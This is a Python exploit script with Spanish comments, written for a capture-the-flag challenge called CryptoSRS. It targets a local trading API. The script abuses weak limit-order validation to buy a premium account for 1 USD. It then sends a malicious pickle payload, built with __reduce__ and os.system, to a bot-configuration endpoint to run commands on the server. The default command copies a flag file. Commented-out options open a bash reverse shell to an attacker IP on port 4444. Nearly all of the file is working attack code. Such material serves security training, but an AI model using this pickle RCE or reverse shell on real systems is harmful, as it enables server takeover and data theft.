#!/usr/bin/env python3
"""
Exploit para vulnerabilidad de deserialización Pickle insegura
CryptoSRS CTF - Nivel 2: Pickle Deserialization

Objetivo: Obtener ejecución remota de código (RCE) mediante un payload pickle malicioso
"""

import requests
import pickle
import base64
import os
import sys
import time

# Configuración
API_URL = "http://localhost:5001/api"
USERNAME = f"exploit_user_{int(time.time())}"
EMAIL = f"exploit_{int(time.time())}@example.com"
PASSWORD = "exploit123"

class RCEPayload:
    """
    Clase maliciosa que ejecuta código cuando es deserializada por pickle
    """
    def __reduce__(self):
        """
        Método especial que pickle usa para serializar/deserializar objetos
        Podemos retornar una tupla (callable, args) que ejecutará código arbitrario
        """
        # Ejemplo 1: Leer un archivo (flag) y guardarla en /tmp/admin_flag.txt
        return (os.system, ('cat /flags/admin_flag.txt > /tmp/admin_flag.txt',))
        
        # Ejemplo 2: Reverse shell
        # return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',))
        
        # Ejemplo 3: Crear archivo de prueba
        # return (os.system, ('echo "PWNED by pickle exploit" > /tmp/pwned.txt',))
        
        # Ejemplo 4: Leer flag y mostrarla en logs
        # return (os.system, ('cat /flags/admin_flag.txt',))

def create_pickle_payload(command=None):
    """
    Crear payload pickle malicioso que ejecutará un comando
    
    Args:
        command: Comando shell a ejecutar (opcional)
    
    Returns:
        str: Payload codificado en base64
    """
    if command:
        # Crear payload personalizado con el comando especificado
        class CustomRCE:
            def __reduce__(self):
                return (os.system, (command,))
        
        malicious_object = CustomRCE()
    else:
        # Usar el payload por defecto
        malicious_object = RCEPayload()
    
    # Serializar el objeto malicioso con pickle
    pickled_payload = pickle.dumps(malicious_object)
    
    # Codificar en base64 para enviar por JSON
    encoded_payload = base64.b64encode(pickled_payload).decode('utf-8')
    
    return encoded_payload

def register_user(session):
    """Registrar nuevo usuario"""
    print(f"[*] Registrando usuario: {USERNAME}")
    
    response = session.post(f"{API_URL}/auth/register", json={
        "username": USERNAME,
        "email": EMAIL,
        "password": PASSWORD
    })
    
    if response.status_code == 201:
        print(f"[+] Usuario registrado exitosamente")
        return True
    else:
        print(f"[-] Error al registrar: {response.text}")
        return False

def login(session):
    """Hacer login y obtener token JWT"""
    print(f"[*] Iniciando sesión como {USERNAME}")
    
    response = session.post(f"{API_URL}/auth/login", json={
        "username": USERNAME,
        "password": PASSWORD
    })
    
    if response.status_code == 200:
        data = response.json()
        token = data.get('access_token')
        print(f"[+] Login exitoso, token obtenido")
        return token
    else:
        print(f"[-] Error al hacer login: {response.text}")
        return None

def get_wallet(session, token):
    """Obtener cartera del usuario"""
    print("[*] Obteniendo información de la cartera")
    
    headers = {"Authorization": f"Bearer {token}"}
    response = session.get(f"{API_URL}/trading/wallet", headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        # El endpoint devuelve una lista de wallets, no un diccionario
        wallet_list = data if isinstance(data, list) else data.get('wallet', [])
        print(f"[+] Cartera obtenida:")
        for coin in wallet_list:
            print(f"    - {coin['coin']}: {coin['balance']}")
        return wallet_list
    else:
        print(f"[-] Error al obtener cartera: {response.text}")
        return None

def create_order(session, token, coin, amount, order_type, price_type='market', target_price=None):
    """Crear una orden en el endpoint real /trading/create-order"""
    headers = {"Authorization": f"Bearer {token}"}
    payload = {
        "coin": coin,
        "amount": amount,
        "order_type": order_type,
        "price_type": price_type
    }
    if target_price is not None:
        payload["target_price"] = target_price

    resp = session.post(f"{API_URL}/trading/create-order", headers=headers, json=payload)
    try:
        data = resp.json()
    except Exception:
        data = {"raw": resp.text}

    return resp.status_code, data

def execute_order(session, token, order_id):
    """Ejecutar orden pendiente (para órdenes limit)"""
    headers = {"Authorization": f"Bearer {token}"}
    resp = session.post(f"{API_URL}/trading/execute-order/{order_id}", headers=headers)
    try:
        data = resp.json()
    except Exception:
        data = {"raw": resp.text}
    return resp.status_code, data

def buy_premium(session, token):
    """Comprar plan premium gastando 1 FlagCoin"""
    headers = {"Authorization": f"Bearer {token}"}
    resp = session.post(f"{API_URL}/flags/buy-premium", headers=headers)
    try:
        data = resp.json()
    except Exception:
        data = {"raw": resp.text}
    return resp.status_code, data

def buy_flagcoin(session, token):
    """
    Obtener flagcoin (y premium) usando los endpoints actuales:
    1) Vender CTFcoin a mercado para conseguir USD
    2) Crear orden LIMIT barata de FlagCoin (1 USD) y ejecutarla
    3) Comprar premium gastando 1 FlagCoin
    """
    print("[*] Intentando escalar a premium comprando FlagCoin con órdenes")

    # Paso 0: obtener balance actual de CTFcoin
    wallet = get_wallet(session, token) or []
    ctf_balance = 0
    for coin in wallet:
        if coin['coin'].lower() == 'ctfcoin':
            ctf_balance = coin['balance']
            break

    if ctf_balance <= 0:
        print("[-] Sin CTFcoin para vender, no se puede continuar")
        return False

    # Paso 1: vender CTFcoin a mercado para obtener USD
    print(f"[*] Vendiendo {ctf_balance} CTFcoin a mercado para conseguir USD")
    status, data = create_order(session, token, coin="CTFcoin", amount=ctf_balance, order_type="SELL", price_type="market")
    print(f"    Status {status} -> {data}")
    if status not in (200, 201):
        print("[-] No se pudo vender CTFcoin")
        return False

    # Paso 2: crear orden LIMIT de FlagCoin muy barata
    print("[*] Creando orden LIMIT de FlagCoin a 1 USD (aprovechando validación débil)")
    # Usamos 'flagcoin' en minúsculas para reutilizar la wallet existente
    status, data = create_order(session, token, coin="flagcoin", amount=1, order_type="BUY", price_type="limit", target_price=1)
    print(f"    Status {status} -> {data}")
    if status not in (200, 201):
        print("[-] No se pudo crear la orden de FlagCoin")
        return False

    order = data.get("order") or {}
    order_id = order.get("id")
    if not order_id:
        print("[-] No se obtuvo order_id para ejecutar la compra de FlagCoin")
        return False

    # Paso 3: ejecutar la orden limit (no valida precio real)
    print(f"[*] Ejecutando orden {order_id} para obtener FlagCoin barata")
    status, data = execute_order(session, token, order_id)
    print(f"    Status {status} -> {data}")
    if status != 200:
        print("[-] No se pudo ejecutar la orden de FlagCoin")
        return False

    # Paso 4: comprar premium gastando 1 FlagCoin
    print("[*] Comprando premium gastando 1 FlagCoin")
    status, data = buy_premium(session, token)
    print(f"    Status {status} -> {data}")
    if status != 200:
        print("[-] No se pudo activar premium")
        return False

    print("[+] Usuario ahora es premium (o debería serlo).")
    return True

def send_malicious_bot(session, token, command=None):
    """
    Enviar bot con configuración pickle maliciosa
    
    Args:
        session: Sesión de requests
        token: Token JWT
        command: Comando shell a ejecutar (opcional)
    """
    print("\n[*] Creando payload pickle malicioso")
    
    # Crear payload
    payload = create_pickle_payload(command)
    print(f"[+] Payload creado (tamaño: {len(payload)} bytes)")
    
    # Enviar al endpoint vulnerable
    print(f"[*] Enviando payload al endpoint /api/bot/configure")
    
    headers = {"Authorization": f"Bearer {token}"}
    response = session.post(f"{API_URL}/bot/configure",
                           headers=headers,
                           json={
                               "name": "Malicious Bot",
                               "config": payload
                           })
    
    print(f"\n[*] Respuesta del servidor:")
    print(f"    Status: {response.status_code}")
    print(f"    Body: {response.text}")
    
    if response.status_code == 201:
        print(f"\n[+] ¡EXPLOIT EXITOSO! Código ejecutado en el servidor")
        print(f"[+] El comando se ejecutó durante la deserialización de pickle")
        return True
    else:
        print(f"\n[-] Exploit falló")
        return False

def main():
    """Función principal del exploit"""
    print("="*60)
    print("CryptoSRS CTF - Pickle Deserialization Exploit")
    print("Nivel 2: Ejecución Remota de Código (RCE)")
    print("="*60)
    print(f"Credenciales -> user: {USERNAME}  pass: {PASSWORD}")
    
    # Crear sesión
    session = requests.Session()
    
    # 1. Registrar usuario
    if not register_user(session):
        print("[-] Fallo al registrar usuario")
        return
    
    # 2. Login
    token = login(session)
    if not token:
        print("[-] Fallo al hacer login")
        return
    
    # 3. Ver cartera inicial
    get_wallet(session, token)
    
    # 4. Comprar flagcoin para obtener premium
    if not buy_flagcoin(session, token):
        print("[-] Fallo al comprar flagcoin")
        return
    
    # 5. Verificar cartera actualizada
    get_wallet(session, token)
    
    # 6. Enviar payload malicioso
    print("\n" + "="*60)
    print("FASE DE EXPLOTACIÓN")
    print("="*60)
    
    # Opción 1: Comando por defecto (crear archivo /tmp/pwned.txt)
    send_malicious_bot(session, token, command='cat /flags/admin_flag.txt > /tmp/admin_flag.txt')
    
    # Opción 2: Comando personalizado
    # Descomentar para leer la flag de admin:
    # send_malicious_bot(session, token, command='cat /flags/admin_flag.txt')
    
    # Opción 3: Reverse shell
    # send_malicious_bot(session, token, command='bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
    
    print("\n" + "="*60)
    print("EXPLOIT COMPLETADO")
    print("="*60)
    print("\nPróximos pasos sugeridos:")
    print("1. Leer flag admin: docker exec cryptosrs-api cat /tmp/admin_flag.txt")
    print("2. Cambiar comando si quieres otro efecto (ej. reverse shell)")
    print("3. Verificar wallet/saldo si lo necesitas")

if __name__ == "__main__":
    main()
